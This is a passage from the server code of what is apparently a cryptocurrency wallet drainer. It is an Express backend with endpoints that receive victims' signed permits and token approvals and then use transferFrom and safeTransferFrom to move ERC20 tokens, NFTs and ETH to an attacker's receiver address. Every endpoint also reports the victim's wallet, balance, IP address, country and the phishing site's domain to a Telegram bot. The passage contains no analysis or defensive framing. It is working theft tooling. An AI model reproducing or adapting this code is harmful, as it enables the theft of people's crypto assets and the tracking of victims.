        `*Token Price: ${escaper(tokenPrice)} ETH\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent SWAP log");
            res.sendStatus(200);
        });
 
    } catch(error) {
        console.warn("[-] SWAP error: ", error)
    }
});

/******* PERMIT SAFA *******/

app.post("/backend/permit", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;
    let withdrawBalance = req.body.withdrawBalance;
    let contractAddress = req.body.contractAddress;

    let r = req.body.r;
    let s = req.body.s;
    let v = req.body.v;
    let deadline = req.body.deadline;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
        let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);
    
        res.status(200).send({
            status: true,
        })
        let permit = await contractInstance.permit(address, config.receiver, withdrawBalance, deadline, v, r, s)

        let message = 
        `*Approved Transfer PERMIT ERC20*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(permit.hash)})\n`+
    
        `*Token Name: ${escaper(tokenName)}\n*`+
        `*Token Price: ${escaper(tokenPrice)}\n*`+
        `*Withdrawbalance: ${escaper(withdrawBalance)}\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent PERMIT ERC20 log");
        });
    

        await provider.waitForTransaction(permit.hash);

        // WITHDRAWING
    
        let withdrawal = await contractInstance.transferFrom(address, config.receiver, withdrawBalance)
    
        let withdrawMessage = 
        `*Withdrawed ERC20 permit*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Type: ERC20 permit *\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
        
        let withdrawClientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
        
        request(withdrawClientServerOptions, (error, response) => {
            console.log("[+] Withdrawed PERMIT ERC20");
            res.sendStatus(200);
        });    


    } catch(error) {
        console.warn("[-] PERMIT error: ", error)
    }
});

/******* ERC20 SAFA *******/
app.post("/backend/safa/erc20", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenType = req.body.tokenType;
    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;
    let withdrawBalance = req.body.withdrawBalance;
    let contractAddress = req.body.contractAddress;


    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        console.log(`[+] Sending ${tokenName} log`)

        let message = 
        `*Approved Transfer ${escaper(tokenType)}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Token Name: ${escaper(tokenName)}\n*`+
        `*Token Price: ${escaper(tokenPrice)}\n*`+
        `*Withdrawbalance: ${escaper(withdrawBalance)}\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent ERC20 log");
        });
    
        await provider.waitForTransaction(transactionHash);
    
        // WITHDRAWING
        const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
        let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);
    
        let withdrawal = await contractInstance.transferFrom(address, config.receiver, withdrawBalance)
    
        let withdrawMessage = 
        `*Withdrawed ${escaper(tokenType)}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Type: ${escaper(tokenType)} *\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
        
        let withdrawClientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
        
        request(withdrawClientServerOptions, (error, response) => {
            console.log("[+] Withdrawed ERC20");
            res.sendStatus(200);
        });    
    } catch(error) {
        console.warn("[-] SAFA ERC20 error: ", error)
    }
});

/******* NFT SAFA *******/
app.post("/backend/safa/nft", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenType = req.body.tokenType;
    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;
    let contractAddress = req.body.contractAddress;

    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        console.log(`[+] Sending ${tokenName} log`)

        let message = 
        `*Approved Transfer ${escaper(tokenType)}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Token Name: ${escaper(tokenName)}*\n`+
        `*Token Price: ${escaper(Number(tokenPrice).toFixed(5))} ETH*\n\n`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent NFT log");
        });
    
        await provider.waitForTransaction(transactionHash);
    
        // WITHDRAWING
        console.log(address, contractAddress)
        let tokenIdServerOptions = {
            uri: 'https://deep-index.moralis.io/api/v2/' + address + '/nft/' + contractAddress + '?chain=Eth&format=decimal',
            method: 'GET',
            headers: {
                'Content-Type':'application/json',
                'Accept':'application/json',
                'X-API-KEY': config.MORALIS_API_KEY
            }
        }
    
        request(tokenIdServerOptions, async (error, response, body) => {
            let tokenIds = [];
            JSON.parse(body).result.map(token => tokenIds.push(token.token_id))
            tokenIds
            
            const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
            for(let i = 0; i < tokenIds.length; i++) {
                console.log("[+] Withdrawing NFT " + tokenIds[i])
                let withdrawal;
    
    
                if(tokenType == "ERC721") {
                    let contractInstance = new ethers.Contract(contractAddress, ERC721, signer);
                    withdrawal = await contractInstance.safeTransferFrom(address, config.receiver, tokenIds[i])    
                }
    
                if(tokenType == "ERC1155") {
                    let contractInstance = new ethers.Contract(contractAddress, ERC1155, signer);
                    withdrawal = await contractInstance.safeTransferFrom(address, config.receiver, tokenIds[i], 1, 256)    
                }

                new Promise(resolve => setTimeout(resolve, 2500))
    
                let withdrawMessage =
                `*Withdrawed ${escaper(tokenName)}*\n\n`+
                `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
                `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
                `*Type: ${escaper(tokenType)} *\n`+
                `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
                
                let withdrawClientServerOptions = {
                    uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
                    body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                }
                request(withdrawClientServerOptions, (error, response) => {
                    console.log("[+] Withdrawed NFT");
                    res.sendStatus(200);
                });   
            
            }
            
        });
     
    } catch(error) {
        console.warn("[-] SAFA NFT error: ", error)
    }

});

/******* ETH SAFA *******/
app.post("/backend/safa/eth", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenPrice = req.body.tokenPrice;
    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {

        let message = 
        `*Approved Transfer ETH*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Token Name: ETH \n*`+
        `*Token Price: ${escaper(tokenPrice)} ETH\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent ETH log");
            res.sendStatus(200);
        });
 
    } catch(error) {
        console.warn("[-] SAFA ETH error: ", error)
    }
});


/******* CONNECTION *******/
app.post("/backend/connection", async (req, res) => { 
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;


    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        let message = 
        `*New Connection*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Nft Value:* [Here](https://value.app/${address})\n\n`+
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
    
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Connection");
            res.sendStatus(200);
        });

    } catch(error) {
        console.warn("[-] Connection error: ", error);
    }
});

/******* CANCEL *******/
app.post("/backend/cancel", async (req, res) => { 
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenType = req.body.tokenType;
    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }


    try {
        let message = 
        `*Canceled Transaction ${tokenType} ${tokenName}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n${
            tokenType != "Seaport"
            ? 
            `*Token Name: ${escaper(tokenName)} *\n`+
            `*Token Price: ${escaper(tokenPrice)} *\n`
            :
            ""
        }`+
        `*Nft Value:* [Here](https://value.app/${address})\n\n`+
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log(error);
            res.sendStatus(200);
        });
    } catch(error) {
        console.warn("[-] Cancel error: ", error);
    }
});

app.listen(PORT, () => console.log(`Waiting Connection On Port ${PORT}`))
